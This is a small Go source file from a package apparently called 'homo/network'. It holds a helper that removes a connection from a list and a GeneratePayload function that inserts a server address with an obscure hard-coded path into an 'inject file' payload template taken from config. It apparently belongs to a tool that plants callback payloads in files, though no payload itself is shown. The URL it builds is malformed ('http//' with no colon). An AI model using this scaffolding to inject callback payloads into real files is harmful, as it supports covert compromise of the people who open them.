package server

import (
	"homo/network/config"
	"net"
	"strings"
)

func RemoveConn(array []net.Conn, elem net.Conn) []net.Conn {

	ret := make([]net.Conn, 0)

	for _, s := range array {
		if s != elem {
			ret = append(ret, s)
		}
	}
	return ret
}

func GeneratePayload() string {

	var host string
	if !config.GetConfig().Api.CustomPathEnabled {
		host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + "/SXkmarwet7vghj"
	} else {
		host = config.GetConfig().Api.Server + ":" + config.GetConfig().Api.Port + config.GetConfig().Api.CustomPath
	}

	payload := strings.ReplaceAll(config.GetConfig().InjectFile.Payload, "{host}", "http//"+host)

	return payload
}
